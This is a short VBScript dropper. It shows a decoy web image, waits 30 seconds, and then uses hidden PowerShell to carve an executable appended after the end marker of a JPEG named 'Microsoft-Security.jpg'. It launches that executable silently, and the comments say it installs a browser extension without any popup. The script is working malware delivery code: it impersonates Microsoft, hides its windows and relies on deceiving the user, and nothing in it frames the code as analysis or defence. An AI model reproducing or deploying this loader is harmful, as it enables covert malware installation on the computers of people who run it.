Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get the folder where this script is located
scriptFolder = FSO.GetParentFolderName(WScript.ScriptFullName)

' URL of the image to show
imageUrl = "https://tse1.mm.bing.net/th/id/OIP.vrM-ts1pcHdhPpmS5p8DsHaGL?r=0&rs=1&pid=ImgDetMain&o=7&rm=3"

' 1. Open the image in the browser (user sees the picture)
WshShell.Run """" & imageUrl & """", 1, False

' 2. Wait 30 seconds
WshShell.Run "powershell -Command ""Start-Sleep -Seconds 30""", 0, True

' 3. Extract the EXE from the JPG in the same folder
jpgPath = FSO.BuildPath(scriptFolder, "Microsoft-Security.jpg")
exePath = FSO.BuildPath(scriptFolder, "Microsoft-Security-installer.exe")

psExtract = "powershell -Command """ _
    & "$b=[IO.File]::ReadAllBytes('" & jpgPath & "');" _
    & "$idx=0;" _
    & "for($i=0;$i -lt $b.Length-1;$i++){if($b[$i]-eq0xFF -and $b[$i+1]-eq0xD9){$idx=$i+2;break}}" _
    & "if($idx -gt 0){[IO.File]::WriteAllBytes('" & exePath & "',$b[$idx..($b.Length-1)])}"""

WshShell.Run psExtract, 0, True

' 4. Run the installer silently (extracts extension, closes browser, no popup)
WshShell.Run """" & exePath & """", 0, False
